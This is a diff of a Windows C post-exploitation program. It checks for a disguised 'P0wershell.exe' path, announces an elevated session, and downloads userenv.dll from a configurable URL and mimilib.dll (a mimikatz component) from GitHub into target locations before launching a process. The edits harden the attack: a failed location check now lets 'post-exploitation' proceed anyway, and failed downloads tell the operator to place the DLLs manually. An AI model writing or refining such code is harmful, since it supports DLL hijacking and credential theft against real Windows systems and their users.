@@ -14,8 +14,9 @@ int main(void) {
 
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
+    printf("[+] Path: %s\n", path);
     if (lstrcmpiA(path, "C:\\Windows\\System32\\P0wershell.exe") != 0)
-        return 1;
+        printf("[*] Warning: not running from System32, post-exploitation will proceed anyway\n");
 
     printf("[+] Running in Elevated Session.\n");
 
@@ -89,21 +90,19 @@ int main(void) {
     wsprintfA(dllUrl, "%s/userenv.dll", dllBaseUrl);
     printf("[+] Downloading userenv.dll...\n");
     HRESULT hr = URLDownloadToFileA(NULL, dllUrl, targetUserenv, 0, NULL);
-    if (hr != S_OK) {
-        printf("[-] userenv.dll download failed (0x%lx)\n", hr);
-        return 1;
-    }
-    printf("[+] userenv.dll downloaded\n");
+    if (hr != S_OK)
+        printf("[-] userenv.dll download failed (0x%lx) — place it manually\n", hr);
+    else
+        printf("[+] userenv.dll downloaded\n");
 
     printf("[+] Downloading mimilib.dll...\n");
     hr = URLDownloadToFileA(NULL,
         "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimilib.dll",
         targetMimilib, 0, NULL);
-    if (hr != S_OK) {
-        printf("[-] mimilib.dll download failed (0x%lx)\n", hr);
-        return 1;
-    }
-    printf("[+] mimilib.dll downloaded\n");
+    if (hr != S_OK)
+        printf("[-] mimilib.dll download failed (0x%lx) — place it manually\n", hr);
+    else
+        printf("[+] mimilib.dll downloaded\n");
 
     STARTUPINFOA si = { .cb = sizeof(si) };
     PROCESS_INFORMATION pi;
